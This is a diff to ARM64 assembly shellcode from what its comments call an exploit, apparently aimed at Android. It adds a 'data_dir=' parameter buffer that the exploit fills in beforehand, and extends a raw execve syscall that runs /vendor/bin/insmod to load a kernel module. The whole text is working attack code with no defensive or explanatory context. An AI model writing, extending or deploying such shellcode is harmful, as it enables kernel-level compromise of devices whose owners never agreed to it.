@@ -28,6 +28,17 @@ ko_target:
 libcxx_ko_target_off:
     .int ko_target - libcxx_data
 
+/* "data_dir=" and its value read as one string: the exploit writes the app's
+ * data dir at libcxx_data_dir_val_off before the shellcode runs. */
+data_dir_param:
+    .ascii "data_dir="
+data_dir_val:
+    .skip 128, 0
+    .balign 4
+    .global libcxx_data_dir_val_off
+libcxx_data_dir_val_off:
+    .int data_dir_val - libcxx_data
+
     .align 4
 
 libcxx_start:
@@ -111,12 +122,14 @@ libcxx_start:
     mov     x8, #SYS_write
     svc     0
 
-    // execve("/vendor/bin/insmod", [exe_path, ko_target, NULL], NULL)
+    // execve("/vendor/bin/insmod", [exe_path, ko_target, data_dir_param, NULL], NULL)
     adr     x1, exe_path
     str     x1, [sp]
     adr     x1, ko_target
     str     x1, [sp, 8]
-    str     xzr, [sp, 16]
+    adr     x1, data_dir_param
+    str     x1, [sp, 16]
+    str     xzr, [sp, 24]
     adr     x0, exe_path
     mov     x1, sp
     mov     x2, xzr
